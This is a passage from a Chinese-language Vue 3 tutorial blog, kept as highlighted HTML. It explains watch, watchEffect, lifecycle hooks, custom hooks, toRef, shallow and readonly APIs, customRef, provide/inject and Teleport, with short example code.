class="hljs-string">&quot;person.name&quot;</span>/&gt;<br>&lt;br/&gt;<br>&lt;input <span class="hljs-attribute">v-model</span>=<span class="hljs-string">&quot;person.age&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>我们使用reactive包裹一个对象</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">let</span> person = reactive(&#123;<br>   <span class="hljs-built_in"> name</span>:<span class="hljs-string">&#x27;on&#x27;</span>,<br>    age:<span class="hljs-string">&#x27;18&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">//watch-情况三-监视对象</span><br>watch(person,(oldVal,<span class="hljs-keyword">new</span><span class="hljs-type">Val</span>)=&gt;&#123;<br>    console.log(oldVal,<span class="hljs-keyword">new</span><span class="hljs-type">Val</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>但是我们得到的数据是:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">Proxy</span> &#123;name: <span class="hljs-string">&#x27;jkl&#x27;</span>, age: <span class="hljs-string">&#x27;18&#x27;</span>&#125; =&gt; <span class="hljs-built_in">Proxy</span> &#123;name: <span class="hljs-string">&#x27;jkl&#x27;</span>, age: <span class="hljs-string">&#x27;18&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>我们发现没有oldValue了，只有newValue，而且自动开启了<strong>深度监视</strong></p><p>如果我们需要使用oldValue就只有使用ref</p><p>还有几种情况：</p><p><img src="https://img-blog.csdnimg.cn/6a16a4068642451599baeaa80939acff.png" alt="watch的几种情况"></p><p>注意一个特殊情况：这里的job是</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">job:</span>&#123;<br><span class="hljs-symbol">    j1:</span>&#123;<br><span class="hljs-symbol">        salary:</span><span class="hljs-string">&quot;1K&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>如果要监视一种属性，要监听里面的数据，要用到深度监视配置deep</strong></p><h4 id="value："><a href="#value：" class="headerlink" title="value："></a>value：</h4><p>我们使用ref包裹基本数据的时候，很多人会习惯了<code>.value</code>，但是在watch中，我们不能使用<code>.value</code>，因为value取到的是值，但是我们需要监视的是一个<code>RefImpl</code>的结构</p><p>但是如果我们包裹的是对象数据，<strong>情况就不一样了</strong>，我们就需要使用<code>.value</code>，因为对象中的<code>.value</code>是一个proxy，它才是真正的监听数据，一般的person只是一个内存地址</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">watch(person.value,<span class="hljs-function"><span class="hljs-params">(oldVal,newVal)</span>=&gt;</span>&#123;<br>   <span class="hljs-built_in">console</span>.log(oldVal,newVal);<br>&#125;)<br></code></pre></td></tr></table></figure><p>还有一种不使用<code>.value</code>的方法，开启深度监视</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">watch(person,<span class="hljs-function"><span class="hljs-params">(oldVal,newVal)</span>=&gt;</span>&#123;<br>   <span class="hljs-built_in">console</span>.log(oldVal,newVal);<br>&#125;,&#123;deep: <span class="hljs-literal">true</span>&#125;)<br></code></pre></td></tr></table></figure><h4 id="watchEffect："><a href="#watchEffect：" class="headerlink" title="watchEffect："></a>watchEffect：</h4><p>vue3中的新属性</p><p>官方文档的定义：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">watchEffect(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>&#123;<br>    const x = person.name;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;name改变了&quot;</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>我们发现我们更改person.name的时候，就会触发回调</p><p>只要我们在回调中用到的数据改变，就会触发回调</p><p>其实watchEffect有点类似computed，<strong>回调中依赖的数据变化，就会执行回调</strong></p><h3 id="5-生命周期"><a href="#5-生命周期" class="headerlink" title="5.生命周期"></a>5.生命周期</h3><p>生命周期大体上和vue2差不多，更新了两个钩子</p><p>取消了beforedestroy和destroy</p><p>更新了：</p><p>beforeUnmount</p><p>在一个组件实例被卸载之前调用。</p><ul><li><p><strong>类型</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">ComponentOptions</span> &#123;<br>  beforeUnmount?(<span class="hljs-keyword">this</span>: ComponentPublicInstance): <span class="hljs-built_in">void</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>详细信息</strong></p><p>当这个钩子被调用时，组件实例依然还保有全部的功能。</p><p><strong>这个钩子在服务端渲染时不会被调用。</strong></p></li></ul><p>和</p><p>unmounted</p><p>在一个组件实例被卸载之后调用。</p><ul><li><p><strong>类型</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">ComponentOptions</span> &#123;<br>  unmounted?(<span class="hljs-keyword">this</span>: ComponentPublicInstance): <span class="hljs-built_in">void</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>详细信息</strong></p><p>一个组件在以下情况下被视为已卸载：</p><ul><li>其所有子组件都已经被卸载。</li><li>所有相关的响应式作用 (渲染作用以及 <code>setup()</code> 时创建的计算属性和侦听器) 都已经停止。</li></ul><p>可以在这个钩子中手动清理一些副作用，例如计时器、DOM 事件监听器或者与服务器的连接。</p><p><strong>这个钩子在服务端渲染时不会被调用。</strong></p></li></ul><p>一般形式和我们vue2中很像，所以我们这里介绍</p><h4 id="组合式API："><a href="#组合式API：" class="headerlink" title="组合式API："></a>组合式API：</h4><p><img src="https://img-blog.csdnimg.cn/52b001236b4a44d3a4ccd04717c00103.png" alt="生命周期组件式API"></p><p>导入之后就可以在setUp中写</p><p>导入：<code>import &#123; reactive, ref, onBeforeMount &#125; from &#39;vue&#39;;</code></p><p>使用：（在setup中）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-keyword">let</span> sum = ref(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">let</span> msg = ref(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>    <span class="hljs-keyword">let</span> person = reactive(&#123;<br>        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;on&#x27;</span>,<br>        <span class="hljs-attr">age</span>:<span class="hljs-string">&#x27;18&#x27;</span>,<br>        <span class="hljs-attr">job</span>:&#123;<br>            <span class="hljs-attr">j1</span>:&#123;<br>                <span class="hljs-attr">salary</span>:<span class="hljs-string">&quot;1K&quot;</span><br>            &#125;<br>        &#125;<br>    &#125;)<br>    <br>    onBeforeMount(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;===onBeforeMount===&quot;</span>);<br>    &#125;)<br><br>    <span class="hljs-keyword">return</span>&#123;<br>        sum,<br>        msg,<br>        person,<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是不提倡组合式api和函数式混用，导致项目结构不清晰</p><h3 id="6-hook"><a href="#6-hook" class="headerlink" title="6.hook"></a>6.hook</h3><p>hook是一个函数，在setup中对组合式api进行封装</p><p>比如我们需要一个获取鼠标坐标的函数，这种函数如果经常用到，我们就需要将它写成模块</p><p>这个模块就是hook</p><p>新建一个src/hook文件夹：写入文件<code>usePoint.js</code></p><p><strong>引入，暴露，函数，返回值都要有</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; reactive, onMounted, onBeforeUnmount &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> points = reactive(&#123;<br>        <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>,<br>        <span class="hljs-attr">y</span>: <span class="hljs-number">0</span>,<br>    &#125;)<br><br>    <span class="hljs-comment">//自定义函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">savePoint</span>(<span class="hljs-params">event</span>) </span>&#123;<br>        points.x = event.pageX;<br>        points.y = event.pageY;<br>        <span class="hljs-built_in">console</span>.log(points.x+<span class="hljs-string">&quot; &quot;</span>+points.y);<br>    &#125;<br><br>    <span class="hljs-comment">//生命周期钩子</span><br>    onMounted(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, savePoint)<br>    &#125;)<br><br>    <span class="hljs-comment">//销毁钩子</span><br>    onBeforeUnmount(<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-built_in">window</span>.removeEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, savePoint)<br>    &#125;)<br><br>    <span class="hljs-comment">//因为要作为函数调用，最后要返回出去</span><br>    <span class="hljs-keyword">return</span> points<br>&#125;<br></code></pre></td></tr></table></figure><p>然后这个模块可以在</p><p>组件中被引入，然后通过函数调用</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml">当前求和为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sum</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sum++&quot;</span>&gt;</span>点我加1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="xml">获取当前鼠标坐标：X:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">points.x</span>&#125;&#125;</span><span class="xml">,y:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">points.y</span>&#125;&#125;</span><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">import</span> usePoint <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/hooks/usePoint&#x27;</span>;</span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">import</span> &#123; ref, &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;</span></span><br><span class="javascript"><span class="xml"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;setUp&#x27;</span>,</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span> &#123;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">let</span> sum = ref(<span class="hljs-number">0</span>)</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-comment">//获取hook中的调用</span></span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">let</span> points = usePoint() </span></span><br><span class="javascript"><span class="xml"></span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">return</span>&#123;</span></span><br><span class="javascript"><span class="xml">            sum,</span></span><br><span class="javascript"><span class="xml">            points</span></span><br><span class="javascript"><span class="xml">        &#125;</span></span><br><span class="javascript"><span class="xml">    &#125;</span></span><br><span class="javascript"><span class="xml">&#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="7-toRef"><a href="#7-toRef" class="headerlink" title="7.toRef"></a>7.toRef</h3><p>当我们需要单独将一个reactive对象中的一个属性比如：name拿出来使用的时候</p><p>如果使用</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">return</span> &#123;<br><span class="hljs-built_in">name</span>: person.<span class="hljs-built_in">name</span><br>&#125;<br></code></pre></td></tr></table></figure><p>就会出现丢失了响应式的问题，所以我们需要使用到toRef</p><p>有需要和之前的person产生联系使用</p><p>相当于一个浅拷贝，有引用关系和指针指向问题</p><p><img src="https://img-blog.csdnimg.cn/970ce1664f8348f7b256f950b8eb78c0.png" alt="toRef"></p><p>或者可以使用<code>toRefs</code>对一个对象的数据进行toRef操作，如果是有深度的数据就需要使用的时候加上层级关系</p><p>但是return的时候需要使用<code>...toRefs(xxx)</code>，展开来进行返回</p><h2 id="5-其他组合式api"><a href="#5-其他组合式api" class="headerlink" title="5. 其他组合式api"></a>5. 其他组合式api</h2><h3 id="1-shallowRef-and-shallowReactive（性能优化）"><a href="#1-shallowRef-and-shallowReactive（性能优化）" class="headerlink" title="1. shallowRef and shallowReactive（性能优化）"></a>1. shallowRef and shallowReactive（性能优化）</h3><p>shallow也就是浅层的意思，顾名思义，<strong>shallowReactive只处理对象浅层的数据的响应式，shallowRef只处理基本类型的数据响应式，不处理对象类型的数据的响应式</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>此时x的值为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x.y</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;x.y++&quot;</span>&gt;</span>点我x.y+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>此时p1的值为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sr.p1</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>此时p2.p3的值为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sr.p2.p3</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sr.p1++&quot;</span>&gt;</span>点击p1+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click-</span>=<span class="hljs-string">&quot;sr.p2.p3++&quot;</span>&gt;</span>点击p3+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  </span><br><span class="xml">import &#123;reactive, shallowReactive, shallowRef, toRefs&#125; from &#x27;vue&#x27;;</span><br><span class="xml">export default &#123;</span><br><span class="xml">  name: &#x27;setUp&#x27;,</span><br><span class="xml">  setup() &#123;</span><br><span class="xml">    let x = shallowRef(&#123;</span><br><span class="xml">      y : 1</span><br><span class="xml">    &#125;)</span><br><span class="xml"></span><br><span class="xml">    let sr = shallowReactive(&#123;</span><br><span class="xml">      p1:1,</span><br><span class="xml">      p2:&#123;</span><br><span class="xml">        p3: 1</span><br><span class="xml">      &#125;</span><br><span class="xml">    &#125;)</span><br><span class="xml">    </span><br><span class="xml">    return&#123;</span><br><span class="xml">      x,</span><br><span class="xml">      sr</span><br><span class="xml">    &#125;</span><br><span class="xml">  &#125;</span><br><span class="xml">&#125;</span><br></code></pre></td></tr></table></figure><p>我们得到的结果是x.y 和p2.p3的值都不会改变 ，但是 p1的值会改变，说明了shallow的浅层响应式的作用</p><h3 id="2-readOnly"><a href="#2-readOnly" class="headerlink" title="2. readOnly"></a>2. readOnly</h3><p>使用readOnly包裹一个数据，使其变成只读的数据，我们将person改为只读数据</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">let</span> <span class="hljs-string">person = reactive(&#123;</span><br>  <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;on&#x27;,</span><br>  <span class="hljs-attr">age</span>:<span class="hljs-string">&#x27;18&#x27;,</span><br>  <span class="hljs-attr">job</span>:<span class="hljs-string">&#123;</span><br>    <span class="hljs-attr">j1</span>:<span class="hljs-string">&#123;</span><br>      <span class="hljs-attr">salary</span>:<span class="hljs-string">&quot;1K&quot;</span><br>    <span class="hljs-attr">&#125;</span><br>  <span class="hljs-attr">&#125;</span><br><span class="hljs-attr">&#125;)</span><br><br><span class="hljs-attr">person</span> = <span class="hljs-string">readonly(person)</span><br></code></pre></td></tr></table></figure><p>此时再更改person中的数据的时候，就会失败而且控制台出现警告</p><p><code>Set operation on key &quot;name&quot; failed: target is readonly. </code></p><p>shallowReadOnly</p><p>带有shallow的都是浅层的意思，那么shallowReadOnly就代表只把浅层的数据改为readOnly的形式</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">let</span> <span class="hljs-string">person = reactive(&#123;</span><br>  <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;on&#x27;,</span><br>  <span class="hljs-attr">age</span>:<span class="hljs-string">&#x27;18&#x27;,</span><br>  <span class="hljs-attr">job</span>:<span class="hljs-string">&#123;</span><br>    <span class="hljs-attr">j1</span>:<span class="hljs-string">&#123;</span><br>      <span class="hljs-attr">salary</span>:<span class="hljs-string">&quot;1K&quot;</span><br>    <span class="hljs-attr">&#125;</span><br>  <span class="hljs-attr">&#125;</span><br><span class="hljs-attr">&#125;)</span><br><br><span class="hljs-attr">person</span> = <span class="hljs-string">shallowReadonly(person)</span><br></code></pre></td></tr></table></figure><p><strong>这样person内层的数据还是可以改变，但是外层的数据已经不能改变了。</strong></p><h3 id="3-toRaw-and-markRaw"><a href="#3-toRaw-and-markRaw" class="headerlink" title="3. toRaw and markRaw"></a>3. toRaw and markRaw</h3><p>raw类方法实现的是<strong>将响应式数据变为普通数据</strong>，也就是取消响应式效果（proxy代理）</p><p>toRaw: 简单的取消响应式</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">person = <span class="hljs-keyword">to</span><span class="hljs-constructor">Raw(<span class="hljs-params">person</span>)</span><br></code></pre></td></tr></table></figure><p>markRaw: 将一个数据永远不设置为响应式</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>给person添加car属性，但car属性不会更改<br><span class="hljs-keyword">function</span> addCar()&#123;<br>  let car = &#123;brand: <span class="hljs-string">&#x27;奔驰&#x27;</span>, price: <span class="hljs-string">&#x27;40w&#x27;</span>&#125;<br>  <span class="hljs-regexp">//m</span>arkRaw使得数据永远不会变为响应式<br>  person.car = markRaw(car)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-customRef"><a href="#4-customRef" class="headerlink" title="4.customRef"></a>4.customRef</h3><p>customRef实现自定义Ref，什么是自定义ref呢？如下代码</p><p>其中的myRef就是我们自定义的ref，需要由我们来维护</p><p>而维护这个ref就需要<strong>使用customRef自己来写响应式的get和set</strong></p><p>我们在set中设置了延迟显示，晚一秒再触发trigger模型解析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//自定义ref</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">myRef</span>(<span class="hljs-params">value</span>)</span>&#123;<br>     <span class="hljs-keyword">let</span> timer<br>   <span class="hljs-comment">//  使用customRef实现自定义ref</span><br>     <span class="hljs-keyword">return</span> customRef(<span class="hljs-function">(<span class="hljs-params">track, trigger</span>)=&gt;</span>&#123;<br>       <span class="hljs-comment">//需要return一个对象</span><br>       <span class="hljs-keyword">return</span>&#123;<br>         <span class="hljs-function"><span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>           <span class="hljs-comment">//将myRef中的value返回出去实现get</span><br>           <span class="hljs-comment">//track实现get的多次调用</span><br>           track()<br>           <span class="hljs-keyword">return</span> value<br>         &#125;,<br>         <span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">newValue</span>)</span>&#123;<br>           <span class="hljs-comment">//set可以获取一个newValue参数</span><br>           <span class="hljs-built_in">clearTimeout</span>(timer)<br>           timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>             value = newValue<br>             <span class="hljs-comment">//trigger实现模板的重新解析</span><br>             trigger()<br>           &#125;,<span class="hljs-number">1000</span>)<br>         &#125;<br>       &#125;<br>     &#125;)<br>   &#125;<br><br>   <span class="hljs-keyword">let</span> hello = myRef(<span class="hljs-string">&quot;hello&quot;</span>);<br>   <span class="hljs-keyword">return</span>&#123;<br>       hello<br>   &#125;<br></code></pre></td></tr></table></figure><p>可是问题是：<strong>如果更改速度过快或者过多，就会触发很多定时器，产生抖动</strong></p><p>所以我们需要在创建一个定时器前清除上一个定时器，保证只有一个定时器</p><p>或者<strong>我们使用setTimeInterval，循环触发trigger</strong></p><h3 id="5-provide-inject"><a href="#5-provide-inject" class="headerlink" title="5. provide inject"></a>5. provide inject</h3><p>这两个api用于祖孙组件间通信</p><p>祖组件：使用provide将需要传输的数据传递出去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">let</span> car = reactive(&#123;<span class="hljs-attr">brand</span>:<span class="hljs-string">&quot;BMW&quot;</span>, <span class="hljs-attr">price</span>:<span class="hljs-string">&quot;40w&quot;</span>&#125;)<br>  provide(<span class="hljs-string">&quot;car&quot;</span>,car)<br>  <span class="hljs-keyword">return</span>&#123;<br>    car<br>  &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>孙组件：使用inject获取传出的数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">let</span> x = inject(<span class="hljs-string">&quot;car&quot;</span>)<br>  <span class="hljs-built_in">console</span>.log(x)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-判断是否为响应式"><a href="#6-判断是否为响应式" class="headerlink" title="6.判断是否为响应式"></a>6.判断是否为响应式</h3><p>使用isRef，isReactive，isReadOnly，isProxy </p><p>分别代表是否是ref等，和是否是Proxy代理的对象</p><h3 id="7-vue3新组件"><a href="#7-vue3新组件" class="headerlink" title="7.vue3新组件"></a>7.vue3新组件</h3><h4 id="1-fragment"><a href="#1-fragment" class="headerlink" title="1.fragment"></a>1.fragment</h4><p>一个vue3中的标签，不参与渲染，比如vue2中vue标签需要一个div包裹整个template，但是vue3中不需要而是一个隐藏的fragment</p><h4 id="2-Teleport"><a href="#2-Teleport" class="headerlink" title="2.Teleport"></a>2.Teleport</h4><p>也是新标签，用于将组件中的dom节点传送到指定的地方</p><p>在我们的文件结构中，父元素是App，子元素是child，孙元素是sun，孙元素拥有一个组件dialog-实现弹窗对话的效果</p><p><strong>dialog组件：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 